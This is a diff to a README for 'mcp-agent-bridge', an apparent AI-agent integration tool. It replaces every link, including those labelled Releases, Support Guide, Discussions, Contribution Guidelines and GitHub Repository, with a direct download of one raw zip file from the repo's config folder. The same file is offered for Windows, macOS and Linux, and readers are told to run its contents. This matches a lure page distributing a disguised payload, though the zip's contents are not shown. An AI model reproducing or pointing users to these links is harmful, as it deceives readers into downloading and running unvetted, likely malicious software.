@@ -1,6 +1,6 @@
 # 🚀 mcp-agent-bridge - Connect AI Agents Seamlessly
 
-[![Download mcp-agent-bridge](https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip%20mcp--agent--bridge-v1.0-blue)](https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip)
+[![Download mcp-agent-bridge](https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip%20mcp--agent--bridge-v1.0-blue)](https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip)
 
 ## 📖 Introduction
 
@@ -21,11 +21,11 @@ Follow the steps below to download and set up mcp-agent-bridge on your device:
 
 ### ⚙️ Step 1: Visit the Download Page
 
-To get the latest version of mcp-agent-bridge, [visit the Releases page](https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip).
+To get the latest version of mcp-agent-bridge, [visit the Releases page](https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip).
 
 ### 📥 Step 2: Download the Application
 
-On the Releases page, you will find different versions of the software available for download. Click on the version you wish to install, and look for the asset file corresponding to your operating system (e.g., https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip for Windows, https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip for macOS, or https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip for Linux).
+On the Releases page, you will find different versions of the software available for download. Click on the version you wish to install, and look for the asset file corresponding to your operating system (e.g., https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip for Windows, https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip for macOS, or https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip for Linux).
 
 ### 💻 Step 3: Install the Application
 
@@ -38,7 +38,7 @@ On the Releases page, you will find different versions of the software available
    - Drag the mcp-agent-bridge icon to your Applications folder.
 
 3. **For Linux**:
-   - Extract the downloaded `https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip` file.
+   - Extract the downloaded `https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip` file.
    - Open the terminal and navigate to the extracted directory.
    - Run the installation script or execute the binary directly.
 
@@ -62,15 +62,15 @@ If you encounter issues during the installation or while running the application
 - Ensure you downloaded the correct version for your operating system.
 - Check if your system meets the minimum requirements.
 - Restart your computer after installation; this can resolve many issues.
-- For further assistance, visit our [Support Guide](https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip) or reach out via our GitHub Issues page.
+- For further assistance, visit our [Support Guide](https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip) or reach out via our GitHub Issues page.
 
 ## 📩 Community and Support
 
-Join our growing community of users! If you have questions, feedback, or suggestions, please share them in our [Discussions page](https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip).
+Join our growing community of users! If you have questions, feedback, or suggestions, please share them in our [Discussions page](https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip).
 
 ## 💬 Contributing
 
-We welcome contributions from everyone. If you want to help improve mcp-agent-bridge, check our [Contribution Guidelines](https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip).
+We welcome contributions from everyone. If you want to help improve mcp-agent-bridge, check our [Contribution Guidelines](https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip).
 
 ## 📝 License
 
@@ -78,7 +78,7 @@ mcp-agent-bridge is open-source software licensed under the MIT License. You can
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip)
-- [Releases Page](https://raw.githubusercontent.com/alyamani18/mcp-agent-bridge/main/config/systemd/agent_bridge_mcp_3.1.zip)
+- [GitHub Repository](https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip)
+- [Releases Page](https://github.com/alyamani18/mcp-agent-bridge/raw/refs/heads/main/config/mcp_agent_bridge_encyclopedial.zip)
 
 Thank you for choosing mcp-agent-bridge! Enjoy seamless integration with your AI agent systems.
